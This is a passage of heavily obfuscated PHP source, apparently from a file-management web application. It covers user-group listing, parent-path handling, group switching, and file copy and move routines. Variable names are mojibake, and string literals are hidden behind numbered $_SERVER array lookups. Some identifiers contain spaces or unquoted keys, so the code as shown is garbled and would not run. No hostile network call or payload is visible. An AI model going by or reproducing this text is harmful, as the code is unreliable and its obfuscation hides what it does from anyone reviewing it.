$¸Äœ¥[$ª’êÈÖ¼[1989]] = isset($¦ı€„ïÇ[$á“˜ºæ”]) ? intval($¦ı€„ïÇ[$á“˜ºæ”]) : !1; } unset($¸Äœ¥); } private function _listAppendChildrenMember(&$”Çôˆ¸´) { $Ù–²»­µ =& $_SERVER[ •ŒÓîÆ]; $ŒØ¸”ë = array_to_keyvalue($”Çôˆ¸´, $Ù–²»­µ[12], $Ù–²»­µ[1888]); $·¥Èèª´ = array($Ù–²»­µ[1888] => array($Ù–²»­µ[7], $ŒØ¸”ë)); $Ùˆ½ôÀğ = array($Ù–²»­µ[1888], $Ù–²»­µ[1988] => $Ù–²»­µ[545]); $ÓÌ”ŒåÇ = Model($Ù–²»­µ[1978])->field($Ùˆ½ôÀğ)->where($·¥Èèª´)->group($Ù–²»­µ[1888])->select(); $Û£¹ÄüÈ = array_to_keyvalue($ÓÌ”ŒåÇ, $Ù–²»­µ[1888], $Ù–²»­µ[545]); foreach ($”Çôˆ¸´ as &$Æ¢¸Ê¼Ô) { $×ÍÑÙÎ² = $Æ¢¸Ê¼Ô[$Ù–²»­µ[1888]]; $Æ¢¸Ê¼Ô[$Ù–²»­µ[1990]] = isset($Û£¹ÄüÈ[$×ÍÑÙÎ²]) ? intval($Û£¹ÄüÈ[$×ÍÑÙÎ²]) : !1; } unset($Æ¢¸Ê¼Ô); } private function _listAppendMeta(&$Àœí‡ŒÍ, $Ô¯†¦Âã) { $Ç¥­ì¡’ =& $_SERVER[ •ŒÓîÆ]; $¦‘©êà = array($Ç¥­ì¡’[1888] => array($Ç¥­ì¡’[7], $Ô¯†¦Âã)); $âìŞ›ä® = Model($Ç¥­ì¡’[1977])->where($¦‘©êà)->select(); $âìŞ›ä® = array_to_keyvalue_group($âìŞ›ä®, $Ç¥­ì¡’[1888]); foreach ($âìŞ›ä® as &$ô»ÎÑšÁ) { $ô»ÎÑšÁ = array_to_keyvalue($ô»ÎÑšÁ, $Ç¥­ì¡’[96], $Ç¥­ì¡’[429]); } unset($ô»ÎÑšÁ); foreach ($Àœí‡ŒÍ as &$â‘•Òº) { $â‘•Òº[$Ç¥­ì¡’[518]] = array(); if (isset($âìŞ›ä®[$â‘•Òº[$Ç¥­ì¡’[1888]]])) { $â‘•Òº[$Ç¥­ì¡’[518]] = $âìŞ›ä®[$â‘•Òº[$Ç¥­ì¡’[1888]]]; } } unset($â‘•Òº); } protected function parentLevelArray($‚–²ùÛ€) { $‚îéÑõÃ =& $_SERVER[ •ŒÓîÆ]; $‚–²ùÛ€ = explode($‚îéÑõÃ[50], trim($‚–²ùÛ€, $‚îéÑõÃ[50])); $‚–²ùÛ€ = array_remove_value($‚–²ùÛ€, $‚îéÑõÃ[214]); return $‚–²ùÛ€; } protected function parentInGroup($æ“ÏèÏÏ, $ø¨ˆ‚€) { $õ•ı–ÌŒ =& $_SERVER[ •ŒÓîÆ]; $ƒø¬­òé = $this->getInfoSimple($æ“ÏèÏÏ); if (!$ƒø¬­òé) { return !0; } $…Ó‰úº = $this->parentLevelArray($ƒø¬­òé[$õ•ı–ÌŒ[565]]); $…Ó‰úº[] = $æ“ÏèÏÏ; foreach ($…Ó‰úº as $æ“ÏèÏÏ) { if (in_array($æ“ÏèÏÏ . $õ•ı–ÌŒ[12], $ø¨ˆ‚€)) { return !0; } } return !1; } private function _listAppendParent(&$ê•—Ôáİ) { $”®¼º©õ =& $_SERVER[ •ŒÓîÆ]; $û–Õ„·Æ = array(); foreach ($ê•—Ôáİ as &$Öñ¾‘çà) { $û–Õ„·Æ[$Öñ¾‘çà[$”®¼º©õ[1888]]] = $Öñ¾‘çà[$”®¼º©õ[32]]; $£ €«ú¬ = $this->parentLevelArray($Öñ¾‘çà[$”®¼º©õ[565]]); foreach ($£ €«ú¬ as $Ó«šàæ) { if (!isset($û–Õ„·Æ[$Ó«šàæ])) { $û–Õ„·Æ[$Ó«šàæ] = 0; } } } unset($Öñ¾‘çà); foreach ($û–Õ„·Æ as $ÁŠ­Û÷— => $Ï•‡”) { if ($Ï•‡”) { continue; } $Ï²ºì³Ç = $this->getInfoSimple($ÁŠ­Û÷—); $û–Õ„·Æ[$ÁŠ­Û÷—] = $Ï²ºì³Ç[$”®¼º©õ[32]]; } $¼¦ë´í = $GLOBALS[$”®¼º©õ[6]][$”®¼º©õ[91]][$”®¼º©õ[1991]]; if ($GLOBALS[$”®¼º©õ[548]] == $”®¼º©õ[90]) { $¼¦ë´í = !1; } foreach ($ê•—Ôáİ as &$Öñ¾‘çà) { $£ €«ú¬ = $this->parentLevelArray($Öñ¾‘çà[$”®¼º©õ[565]]); $›ğØñˆ‚ = $”®¼º©õ[12]; foreach ($£ €«ú¬ as $ÁŠ­Û÷— => $Ó«šàæ) { if ($¼¦ë´í && $ÁŠ­Û÷— == 0) { continue; } $›ğØñˆ‚ .= $û–Õ„·Æ[$Ó«šàæ] . $”®¼º©õ[8]; } if ($£ €«ú¬) { $›ğØñˆ‚ .= $Öñ¾‘çà[$”®¼º©õ[32]]; } $Öñ¾‘çà[$”®¼º©õ[570]] = str_replace($”®¼º©õ[573], $”®¼º©õ[8], $›ğØñˆ‚); } unset($Öñ¾‘çà); } private function _listAppendSourceRoot(&$—–ÒŒ£´, $ô•ş¯Î¨) { $ĞÂÍˆ =& $_SERVER[ •ŒÓîÆ]; $Ö°Š¾Ù¾ = Model($ĞÂÍˆ[866])->listSourceRoot(SourceModel::TYPE_GROUP, $ô•ş¯Î¨); $Ö°Š¾Ù¾ = array_to_keyvalue($Ö°Š¾Ù¾, $ĞÂÍˆ[550]); $Ö°Š¾Ù¾ = array_remove_key($Ö°Š¾Ù¾, $ĞÂÍˆ[550]); foreach ($—–ÒŒ£´ as &$îÑò²Ëà) { $îÑò²Ëà[$ĞÂÍˆ[89]] = $Ö°Š¾Ù¾[$îÑò²Ëà[$ĞÂÍˆ[1888]]] ? $Ö°Š¾Ù¾[$îÑò²Ëà[$ĞÂÍˆ[1888]]] : array(); } unset($îÑò²Ëà); } protected function groupMerge($ñü­ííŒ) { $ñü­ííŒ = array_values(array_unique($ñü­ííŒ)); $³«ıç‹Û = array(); for ($ÓŠØî™¯ = 0; $ÓŠØî™¯ < count($ñü­ííŒ); $ÓŠØî™¯++) { $¿¦Æ¦‹Ì = !1; for ($¾µÁ‡½ = 0; $¾µÁ‡½ < count($ñü­ííŒ); $¾µÁ‡½++) { if ($ÓŠØî™¯ == $¾µÁ‡½) { continue; } if ($this->isParentOf($ñü­ííŒ[$¾µÁ‡½], $ñü­ííŒ[$ÓŠØî™¯])) { $¿¦Æ¦‹Ì = !0; break; } } if (!$¿¦Æ¦‹Ì) { $³«ıç‹Û[] = $ñü­ííŒ[$ÓŠØî™¯]; } } return $³«ıç‹Û; } protected function isParentOf($Â¨óÚñ†, $Ã˜û¥ˆ) { $èÄ¾¾µç =& $_SERVER[ •ŒÓîÆ]; if (!$Â¨óÚñ† || !$Ã˜û¥ˆ || $Â¨óÚñ† == $Ã˜û¥ˆ) { return !1; } $üÈ÷°æ = $this->getInfoSimple($Â¨óÚñ†); $ç“È = $this->getInfoSimple($Ã˜û¥ˆ); $Ë”‰§ä = $üÈ÷°æ[$èÄ¾¾µç[565]] . $Â¨óÚñ† . $èÄ¾¾µç[50]; if (substr($ç“È[$èÄ¾¾µç[565]], 0, strlen($Ë”‰§ä)) == $Ë”‰§ä) { return !0; } return !1; } public function groupShowRoot($ÜÒ²úÎí, $¡ÃşÖ¢£ = false) { $–»ïÎ² =& $_SERVER[ •ŒÓîÆ]; $¬ÍÌ·¼Í = $this->getInfo($ÜÒ²úÎí); if (!$¬ÍÌ·¼Í) { return array(); } $ä‚ƒÃı× = $this->parentLevelArray($¬ÍÌ·¼Í[$–»ïÎ²[565]]); $šíï›æƒ = array($ÜÒ²úÎí); if (count($ä‚ƒÃı×) == 0) { return $šíï›æƒ; } if ($¡ÃşÖ¢£ && count($ä‚ƒÃı×) == 1) { return $šíï›æƒ; } if (!$¬ÍÌ·¼Í[$–»ïÎ²[518]] || !isset($¬ÍÌ·¼Í[$–»ïÎ²[518]][$–»ïÎ²[1974]]) || $¬ÍÌ·¼Í[$–»ïÎ²[518]][$–»ïÎ²[1974]] == $–»ïÎ²[1943]) { return $this->groupShowRoot($ä‚ƒÃı×[count($ä‚ƒÃı×) - 1], $¡ÃşÖ¢£); } if ($¬ÍÌ·¼Í[$–»ïÎ²[518]][$–»ïÎ²[1974]] == $–»ïÎ²[412]) { $¢²ÅæÀ = explode($–»ïÎ²[50], $¬ÍÌ·¼Í[$–»ïÎ²[518]][$–»ïÎ²[1975]]); if ($¢²ÅæÀ) { $šíï›æƒ = array_merge($šíï›æƒ, $¢²ÅæÀ); } } return $šíï›æƒ; } protected function resetParentLevel() { $äèÂ Äõ =& $_SERVER[ •ŒÓîÆ]; $Ò…÷Ï“ø = $äèÂ Äõ[1888]; $…¯Ï«ç = $this->select(); $…¯Ï«ç = array_to_keyvalue($…¯Ï«ç, $Ò…÷Ï“ø); foreach ($…¯Ï«ç as $Ëó®é¬Ñ) { $ş³˜Üûï = $Ëó®é¬Ñ; $Ò áÆ¾® = array(); while ($ş³˜Üûï[$äèÂ Äõ[182]] != 0) { $Ò áÆ¾®[] = $ş³˜Üûï[$äèÂ Äõ[182]]; $ş³˜Üûï = $…¯Ï«ç[$ş³˜Üûï[$äèÂ Äõ[182]]]; } $Ò áÆ¾®[] = 0; $Ò áÆ¾® = $äèÂ Äõ[50] . implode($äèÂ Äõ[50], array_reverse($Ò áÆ¾®)) . $äèÂ Äõ[50]; $this->setNamePinyin($Ëó®é¬Ñ[$Ò…÷Ï“ø], $Ëó®é¬Ñ[$äèÂ Äõ[32]]); $this->where(array($Ò…÷Ï“ø => $Ëó®é¬Ñ[$Ò…÷Ï“ø]))->save(array($äèÂ Äõ[632] => $Ò áÆ¾®)); } return $…¯Ï«ç; } public function groupNameAuto($öÕÒ©Ù™, $ÕÑıÄ) { $Èø€Û½ª =& $_SERVER[ •ŒÓîÆ]; $ö§ç = $this->where(array($Èø€Û½ª[456] => $öÕÒ©Ù™))->getField($Èø€Û½ª[32], !0); if (!$ö§ç || !in_array($ÕÑıÄ, $ö§ç)) { return $ÕÑıÄ; } for ($Ÿ¤¿Íî = 1; $Ÿ¤¿Íî <= count($ö§ç) + 1; $Ÿ¤¿Íî++) { $õæÈîş“ = $ÕÑıÄ . "\x28{$Ÿ¤¿Íî}\x29"; if (!in_array($õæÈîş“, $ö§ç)) { return $õæÈîş“; } } } public function groupSwitch($Å§ƒ‘ÕÎ, $°ÆŞş³Í) { $·ÅÈ¥óø =& $_SERVER[ •ŒÓîÆ]; $¢òğ­´ = array($·ÅÈ¥óø[1888] => array($·ÅÈ¥óø[7], array($Å§ƒ‘ÕÎ, $°ÆŞş³Í))); $âŒ Ü¶ = $this->where($¢òğ­´)->select(); $âŒ Ü¶ = array_to_keyvalue($âŒ Ü¶, $·ÅÈ¥óø[1888]); if (!isset($âŒ Ü¶[$Å§ƒ‘ÕÎ]) || !isset($âŒ Ü¶[$°ÆŞş³Í]) || $âŒ Ü¶[$Å§ƒ‘ÕÎ][$·ÅÈ¥óø[182]] == 0) { return !1; } $¢òğ­´ = array($·ÅÈ¥óø[1888] => $Å§ƒ‘ÕÎ); $ñïÉÒø = Model($·ÅÈ¥óø[1978])->where($¢òğ­´)->select(); if (!$ñïÉÒø) { $ñïÉÒø = array(); } foreach ($ñïÉÒø as $º¿³àÃä) { $¨×ßıî“ = $º¿³àÃä[$·ÅÈ¥óø[1690]]; $¢òğ­´ = array($·ÅÈ¥óø[1690] => $¨×ßıî“, $·ÅÈ¥óø[1888] => $°ÆŞş³Í); $ëˆµĞ´Â = Model($·ÅÈ¥óø[1978])->where($¢òğ­´)->find(); if (!$ëˆµĞ´Â) { $»¬—“ = array($°ÆŞş³Í => $º¿³àÃä[$·ÅÈ¥óø[1992]]); Model($·ÅÈ¥óø[579])->userGroupAdd($¨×ßıî“, $»¬—“); } Model($·ÅÈ¥óø[579])->userGroupRemove($¨×ßıî“, $Å§ƒ‘ÕÎ); } $¢òğ­´ = array($·ÅÈ¥óø[180] => 2, $·ÅÈ¥óø[182] => 0, $·ÅÈ¥óø[464] => 1, $·ÅÈ¥óø[550] => array($·ÅÈ¥óø[7], array($Å§ƒ‘ÕÎ, $°ÆŞş³Í))); $àÔ¨İâÏ = Model($·ÅÈ¥óø[866])->where($¢òğ­´)->field($·ÅÈ¥óø[1993])->select(); $àÔ¨İâÏ = array_to_keyvalue($àÔ¨İâÏ, $·ÅÈ¥óø[550], $·ÅÈ¥óø[183]); $å·¼Â‘Ö = !empty($àÔ¨İâÏ[$Å§ƒ‘ÕÎ]) ? $àÔ¨İâÏ[$Å§ƒ‘ÕÎ] : !1; if ($å·¼Â‘Ö) { if (!$àÔ¨İâÏ[$°ÆŞş³Í]) { $àÔ¨İâÏ[$°ÆŞş³Í] = Model($·ÅÈ¥óø[866])->groupRootAdd($°ÆŞş³Í); } $‘²—¬…„ = $àÔ¨İâÏ[$°ÆŞş³Í]; $¢òğ­´ = array($·ÅÈ¥óø[182] => $å·¼Â‘Ö); $àÔ¨İâÏ = Model($·ÅÈ¥óø[866])->where($¢òğ­´)->field($·ÅÈ¥óø[1994])->select(); if (!$àÔ¨İâÏ) { $àÔ¨İâÏ = array(); } Model($·ÅÈ¥óø[866])->moveClearAuth = !1; foreach ($àÔ¨İâÏ as $ÁÇÅ”¨¬) { $ââçÏĞŞ = $ÁÇÅ”¨¬[$·ÅÈ¥óø[464]] == $·ÅÈ¥óø[90] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($·ÅÈ¥óø[866])->move($ÁÇÅ”¨¬[$·ÅÈ¥óø[183]], $‘²—¬…„, $ââçÏĞŞ); } Model($·ÅÈ¥óø[866])->moveClearAuth = !0; $¢òğ­´ = array($·ÅÈ¥óø[180] => 2, $·ÅÈ¥óø[550] => $Å§ƒ‘ÕÎ); $êï¿ĞÆª = array($·ÅÈ¥óø[550] => $°ÆŞş³Í); Model($·ÅÈ¥óø[1995])->where($¢òğ­´)->save($êï¿ĞÆª); Model($·ÅÈ¥óø[1996])->where($¢òğ­´)->save($êï¿ĞÆª); } $this->_changeChildLevel($âŒ Ü¶[$Å§ƒ‘ÕÎ], $âŒ Ü¶[$°ÆŞş³Í], !0); $this->where(array($·ÅÈ¥óø[182] => $Å§ƒ‘ÕÎ))->save(array($·ÅÈ¥óø[182] => $°ÆŞş³Í)); $this->_clearChildrenCache($âŒ Ü¶[$°ÆŞş³Í]); return !0; } } $_file = $_SERVER[$_SERVER[ •ŒÓîÆ][256]]; goto eÑÔÏÙÈö; FÛº¿ß‡: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Â«©•©í, $µø ¥Ø) { $Ä²Ï•Ä™ =& $_SERVER[ •ŒÓîÆ]; $öéÙÅì™ = $µø ¥Ø; $GLOBALS[$Ä²Ï•Ä™[1187]] = $Ä²Ï•Ä™[1188] . $Â«©•©í; Hook::trigger($Ä²Ï•Ä™[1188] . $Â«©•©í . $Ä²Ï•Ä™[1189], $öéÙÅì™); $ğÃÖÜ‘å = self::driverMake($µø ¥Ø[0]); if (!$ğÃÖÜ‘å) { return !1; } if (method_exists($ğÃÖÜ‘å, $Â«©•©í)) { $ïğßâŸ˜ = @call_user_func_array(array($ğÃÖÜ‘å, $Â«©•©í), $µø ¥Ø); } else { if (method_exists($ğÃÖÜ‘å, $Ä²Ï•Ä™[1190])) { $ïğßâŸ˜ = @call_user_func_array(array($ğÃÖÜ‘å, $Â«©•©í), $µø ¥Ø); } else { if (method_exists(self, $Â«©•©í)) { $ïğßâŸ˜ = @call_user_func_array(array(self, $Â«©•©í), $µø ¥Ø); } else { $ïğßâŸ˜ = call_user_func_array(array(parent, $Â«©•©í), $µø ¥Ø); } } } Hook::trigger($Ä²Ï•Ä™[1188] . $Â«©•©í . $Ä²Ï•Ä™[1191], $öéÙÅì™, $ïğßâŸ˜); return $ïğßâŸ˜; } public static function init($—„ìÁÆá) { return self::driverMake($—„ìÁÆá); } public static function copy($ŞËÔµòç, $£éººû, $­ëùÈşá = false, $–Ş£ = false) { return self::copyMoveStart($ŞËÔµòç, $£éººû, $­ëùÈşá, $_SERVER[ •ŒÓîÆ][598], $–Ş£); } public static function move($‘£ìÍŸÚ, $ÊèµšÎ¾, $ÎÛ°ÄÃŞ = false, $ñÜ°èóî = false) { return self::copyMoveStart($‘£ìÍŸÚ, $ÊèµšÎ¾, $ÎÛ°ÄÃŞ, $_SERVER[ •ŒÓîÆ][600], $ñÜ°èóî); } private static function copyMoveStart($ŞâĞ¿ˆì, $ù®Ê„ÙÌ, $²öŸ¨±, $„‡–ÎŒğ, $ë®Ûğş­) { $›“¡¥®Î =& $_SERVER[ •ŒÓîÆ]; $ Üî»£à = array($ŞâĞ¿ˆì, $ù®Ê„ÙÌ, $²öŸ¨±, $ë®Ûğş­); Hook::trigger($›“¡¥®Î[1188] . $„‡–ÎŒğ . $›“¡¥®Î[1189], $ Üî»£à); $ê±¢ö‰ = self::copyMove($ŞâĞ¿ˆì, $ù®Ê„ÙÌ, $²öŸ¨±, $„‡–ÎŒğ, $ë®Ûğş­); Hook::trigger($›“¡¥®Î[1188] . $„‡–ÎŒğ . $›“¡¥®Î[1191], $ Üî»£à, $ê±¢ö‰); return $ê±¢ö‰; } public static function saveFile($¥Ì¹Œ•œ, $«ªóºÆÂ, $î¹Å”ÔÌ = true) { $û®–œà =& $_SERVER[ •ŒÓîÆ]; $ö¸¶®¡› = self::info($«ªóºÆÂ); $Äü ¨ó = self::driverMake($¥Ì¹Œ•œ); $´ÛÜ® = self::driverMake($«ªóºÆÂ); $ø‰ª„½ = !1; if ($´ÛÜ®->pathParse[$û®–œà[1192]]) { $ø‰ª„½ = $´ÛÜ®; $¾‹˜‚ŠÔ = $´ÛÜ®->pathParse[$û®–œà[1192]]; $´ÛÜ® = self::driverMake($¾‹˜‚ŠÔ); } if ($Äü ¨ó->pathParse[$û®–œà[1192]]) { $Ó¢¸ÛÈ¨ = $Äü ¨ó->pathParse[$û®–œà[1192]]; $Äü ¨ó = self::driverMake($Ó¢¸ÛÈ¨); } $ûŠà…ç = $´ÛÜ®->pathFather($«ªóºÆÂ); $ôˆËéõá = !0; if (!$î¹Å”ÔÌ && self::driverIsSame($Äü ¨ó, $´ÛÜ®)) { $ôˆËéõá = !1; } $¬é»ÏÜš = self::copyFile($Äü ¨ó, $¥Ì¹Œ•œ, $´ÛÜ®, $ûŠà…ç, $ö¸¶®¡›[$û®–œà[32]], $ôˆËéõá); if ($ø‰ª„½) { $¬é»ÏÜš = $ø‰ª„½->getPathOuter($¬é»ÏÜš); } return $¬é»ÏÜš; } private static function copyMove($ñš¡ÈÛí, $¢ÜÅõ¯Ì, $ÅÚÌ¿¯Ø, $œõ‡º, $®ß¦¾Í° = false) { $Œ¯Ô”Íš =& $_SERVER[ •ŒÓîÆ]; if (!$ñš¡ÈÛí || $ñš¡ÈÛí == $Œ¯Ô”Íš[8] || !$¢ÜÅõ¯Ì) { return !1; } ignore_timeout(); $»ñÏŞô° = self::driverMake($ñš¡ÈÛí); $™»ı©óÜ = self::driverMake($¢ÜÅõ¯Ì); $Ç»Üê½ş = $œõ‡º == $Œ¯Ô”Íš[600]; $ÁŠ½ëˆ´ = !1; if ($™»ı©óÜ->pathParse[$Œ¯Ô”Íš[1192]]) { $ÁŠ½ëˆ´ = $™»ı©óÜ; $¢ÜÅõ¯Ì = $™»ı©óÜ->pathParse[$Œ¯Ô”Íš[1192]]; $™»ı©óÜ = self::driverMake($¢ÜÅõ¯Ì); } if ($»ñÏŞô°->pathParse[$Œ¯Ô”Íš[1192]]) { $ñš¡ÈÛí = $»ñÏŞô°->pathParse[$Œ¯Ô”Íš[1192]]; $»ñÏŞô° = self::driverMake($ñš¡ÈÛí); } self::check($»ñÏŞô°, $ñš¡ÈÛí, $™»ı©óÜ, $¢ÜÅõ¯Ì); Hook::trigger($Œ¯Ô”Íš[1193], $»ñÏŞô°, $ñš¡ÈÛí, $™»ı©óÜ, $¢ÜÅõ¯Ì); $é ®ºƒÉ = self::driverIsSame($»ñÏŞô°, $™»ı©óÜ); if ($é ®ºƒÉ) { if ($œõ‡º == $Œ¯Ô”Íš[600] && !method_exists($™»ı©óÜ, $Œ¯Ô”Íš[1194]) && trim($¢ÜÅõ¯Ì, $Œ¯Ô”Íš[8]) == trim($™»ı©óÜ->pathFather($ñš¡ÈÛí), $Œ¯Ô”Íš[8])) { if ($»ñÏŞô°->pathThis($ñš¡ÈÛí) != $®ß¦¾Í° && !$»ñÏŞô°->isTypeObject()) { return $»ñÏŞô°->rename($ñš¡ÈÛí, $®ß¦¾Í°); } return $™»ı©óÜ->getPathOuter($ñš¡ÈÛí); } if (method_exists($™»ı©óÜ, $œõ‡º)) { return $™»ı©óÜ->{$œõ‡º}($ñš¡ÈÛí, $¢ÜÅõ¯Ì, $ÅÚÌ¿¯Ø, $®ß¦¾Í°); } } if ($é ®ºƒÉ && $œõ‡º == $Œ¯Ô”Íš[600] && $™»ı©óÜ->getType() == $Œ¯Ô”Íš[108]) { $á¯¬÷ú = $™»ı©óÜ->movePath($ñš¡ÈÛí, $¢ÜÅõ¯Ì, $®ß¦¾Í°); if ($á¯¬÷ú) { return $á¯¬÷ú; } } $×öµãïâ = $»ñÏŞô°->isFile($ñš¡ÈÛí); if (!$×öµãïâ && $™»ı©óÜ->getType() == $Œ¯Ô”Íš[798] && $»ñÏŞô°->getType() == $Œ¯Ô”Íš[108]) { $á¯¬÷ú = $™»ı©óÜ->copyFolderFromIO($»ñÏŞô°, $ñš¡ÈÛí, $¢ÜÅõ¯Ì, $ÅÚÌ¿¯Ø, $Ç»Üê½ş, $®ß¦¾Í°); } else { $á¯¬÷ú = self::copyPath($»ñÏŞô°, $ñš¡ÈÛí, $™»ı©óÜ, $¢ÜÅõ¯Ì, $ÅÚÌ¿¯Ø, $Ç»Üê½ş, $×öµãïâ, $®ß¦¾Í°); } if ($á¯¬÷ú && $Ç»Üê½ş) { $»ñÏŞô°->remove($ñš¡ÈÛí); } if ($ÁŠ½ëˆ´) { $á¯¬÷ú = $ÁŠ½ëˆ´->getPathOuter($á¯¬÷ú); } return $á¯¬÷ú; } private static function check($³ÔâÛÉû, $°çíäîÅ, $í‹Î«¬¢, &$×„‹ï€) { $ÑÜ„Ã¢ˆ =& $_SERVER[ •ŒÓîÆ]; if (self::driverIsSame($³ÔâÛÉû, $í‹Î«¬¢) && $³ÔâÛÉû->isFolder($°çíäîÅ) && $³ÔâÛÉû->isParentOf($°çíäîÅ, $×„‹ï€)) { show_json(LNG($ÑÜ„Ã¢ˆ[1195]), !1); } if (!$³ÔâÛÉû->exist($°çíäîÅ)) { show_json(LNG($ÑÜ„Ã¢ˆ[107]), !1); } } private static function copyPath($Ù¢¯“Ÿ, $±š´–¨, $ûƒ™¨º•, $ğŞ ¡¢Å, $ûŒ®‘äœ, $õè éÇ, $©¯¹º›ù, $¢®À –„ = false, $Íƒãñ¬Î = true) { $´³…å¯ò =& $_SERVER[ •ŒÓîÆ]; $ˆôİîÊ‡ = empty($¢®À –„) && $¢®À –„ !== $´³…å¯ò[214] ? $Ù¢¯“Ÿ->pathThis($±š´–¨) : $¢®À –„; if ($ûŒ®‘äœ) { $ãá”èµû = $ûƒ™¨º•->fileNameExist($ğŞ ¡¢Å, $ˆôİîÊ‡); $‡­òö…¬ = $ˆôİîÊ‡; $ˆôİîÊ‡ = $ûƒ™¨º•->fileNameAuto($ğŞ ¡¢Å, $ˆôİîÊ‡, $ûŒ®‘äœ, !$©¯¹º›ù); if (!$ãá”èµû || $‡­òö…¬ != $ˆôİîÊ‡) { $ûŒ®‘äœ = !1; } if ($Íƒãñ¬Î && !$ûŒ®‘äœ) { $ûƒ™¨º•->_data[$´³…å¯ò[1196]] = !0; } } if ($©¯¹º›ù) { return self::copyFile($Ù¢¯“Ÿ, $±š´–¨, $ûƒ™¨º•, $ğŞ ¡¢Å, $ˆôİîÊ‡, $õè éÇ); } if ($ûŒ®‘äœ == REPEAT_RENAME_FOLDER) { $ûŒ®‘äœ = !1; } $Üù‡ş€¯ = rtrim($ğŞ ¡¢Å, $´³…å¯ò[8]) . $´³…å¯ò[8] . $ˆôİîÊ‡; $ü€ş˜¢ = $ûƒ™¨º•->mkdir($ûƒ™¨º•->getPath($Üù‡ş€¯), $ûŒ®‘äœ); $ğŞ ¡¢Å = $ûƒ™¨º•->getPathInner($ü€ş˜¢); $ñˆ¤òã³ = $Ù¢¯“Ÿ->listPath($±š´–¨, !0); $ñˆ¤òã³ = is_array($ñˆ¤òã³) ? $ñˆ¤òã³ : array($´³…å¯ò[85] => array(), $´³…å¯ò[84] => array()); $Öã™çìî = array_merge($ñˆ¤òã³[$´³…å¯ò[85]], $ñˆ¤òã³[$´³…å¯ò[84]]); foreach ($Öã™çìî as $ÀæÕ–Ò“) { $½¸Â„Ù = $ÀæÕ–Ò“[$´³…å¯ò[33]] == $´³…å¯ò[216]; $±š´–¨ = $Ù¢¯“Ÿ->getPathInner($ÀæÕ–Ò“[$´³…å¯ò[86]]); $ÇÁ¬ûöµ = self::copyPath($Ù¢¯“Ÿ, $±š´–¨, $ûƒ™¨º•, $ğŞ ¡¢Å, $ûŒ®‘äœ, $õè éÇ, $½¸Â„Ù, !1, !1); if (!$ÇÁ¬ûöµ) { IO::errorTips($´³…å¯ò[1197] . $±š´–¨ . $´³…å¯ò[72] . $ğŞ ¡¢Å); } } self::copyMoveKeepInfo($Ù¢¯“Ÿ, $±š´–¨, $ü€ş˜¢); return $ü€ş˜¢; } private static function copyFile($®Å›ìè, $›Ñ°¥ÁÒ, $’ìÕ‚ª®, $—›†ª¶í, $Š¾ñŠ¢ù, $ôôÄĞ´) { $–ÉÉ¹¼ó =& $_SERVER[ •ŒÓîÆ]; $—›†ª¶í = $’ìÕ‚ª®->getPath(rtrim($—›†ª¶í, $–ÉÉ¹¼ó[8]) . $–ÉÉ¹¼ó[8] . $Š¾ñŠ¢ù); $¬áŸº“© = $–ÉÉ¹¼ó[1198] . time() . rand_string(5); Hook::trigger($–ÉÉ¹¼ó[1199], $®Å›ìè, $›Ñ°¥ÁÒ, $’ìÕ‚ª®, $—›†ª¶í, $Š¾ñŠ¢ù, $¬áŸº“©); if (self::driverIsSame($®Å›ìè, $’ìÕ‚ª®)) { if ($ôôÄĞ´) { $Ãûİœ®‡ = $’ìÕ‚ª®->moveFile($›Ñ°¥ÁÒ, $—›†ª¶í); } else { $Ãûİœ®‡ = $’ìÕ‚ª®->copyFile($›Ñ°¥ÁÒ, $—›†ª¶í); } Hook::trigger($–ÉÉ¹¼ó[1200], $®Å›ìè, $›Ñ°¥ÁÒ, $’ìÕ‚ª®, $—›†ª¶í, $Š¾ñŠ¢ù, $Ãûİœ®‡); self::copyMoveKeepInfo($®Å›ìè, $›Ñ°¥ÁÒ, $Ãûİœ®‡); return $Ãûİœ®‡; } $ÍÚŸ´¹® = TEMP_FILES; if ($GLOBALS[$–ÉÉ¹¼ó[6]][$–ÉÉ¹¼ó[91]][$–ÉÉ¹¼ó[837]]) { $ÍÚŸ´¹® = $GLOBALS[$–ÉÉ¹¼ó[6]][$–ÉÉ¹¼ó[91]][$–ÉÉ¹¼ó[837]]; } $¹¿ÆÖ– = $ÍÚŸ´¹®; mk_dir($¹¿ÆÖ–); $¦¼Èå÷Œ = $¹¿ÆÖ– . $¬áŸº“©; $×¤°öéâ = $¦¼Èå÷Œ; $¦¼Èå÷Œ = $®Å›ìè->download($›Ñ°¥ÁÒ, $¦¼Èå÷Œ); $¦¼Èå÷Œ = $®Å›ìè->iconvApp($¦¼Èå÷Œ); if (substr($¦¼Èå÷Œ, strlen($ÍÚŸ´¹®)) == $ÍÚŸ´¹®) { $ôôÄĞ´ = !0; } $Ãûİœ®‡ = $’ìÕ‚ª®->upload($—›†ª¶í, $¦¼Èå÷Œ, $ôôÄĞ´); self::remove($×¤°öéâ); Hook::trigger($–ÉÉ¹¼ó[1200], $®Å›ìè, $›Ñ°¥ÁÒ, $’ìÕ‚ª®, $—›†ª¶í, $Š¾ñŠ¢ù, $Ãûİœ®‡); self::copyMoveKeepInfo($®Å›ìè, $›Ñ°¥ÁÒ, $Ãûİœ®‡); return $Ãûİœ®‡; } private static function copyMoveKeepInfo($ì£Ï§¢, $Ó©½Èö£, $»›ëØ¢™) { if (!$»›ëØ¢™) { return; } $ÀÇ¤üßÂ = $ì£Ï§¢->info($Ó©½Èö£); if (!is_array($ÀÇ¤üßÂ)) { return; } IO::setModifyTime($»›ëØ¢™, $ÀÇ¤üßÂ[$_SERVER[ •ŒÓîÆ][87]]); } public static function pathFather($¦šù“–) { $¢ª´ò…‹ = IO::init($¦šù“–); $Ğğ®¦·­ = $¢ª´ò…‹->pathFather($¢ª´ò…‹->path); return $¢ª´ò…‹->getPathOuter($Ğğ®¦·­); } public static function fileOut($ÃâÙ†ü, $ØïÎğ­¹ = false, $‘€ë¸« = false, $±‘¹«†ã = '') { $ë¤§¯´æ = self::driverMake($ÃâÙ†ü); if ($ë¤§¯´æ->isFileOutServer()) { return $ë¤§¯´æ->fileOutServer($ÃâÙ†ü, $ØïÎğ­¹, $‘€ë¸«, $±‘¹«†ã); } return $ë¤§¯´æ->fileOut($ÃâÙ†ü, $ØïÎğ­¹, $‘€ë¸«, $±‘¹«†ã); } public static function fileOutImage($²ìŞ”’‡, $™ƒĞéâ = 250) { $Æ†¾ÀŒê = array(250, 600, 1200, 2000, 3000, 5000); for ($È€’äÄ = 0; $È€’äÄ < count($Æ†¾ÀŒê); $È€’äÄ++) { if 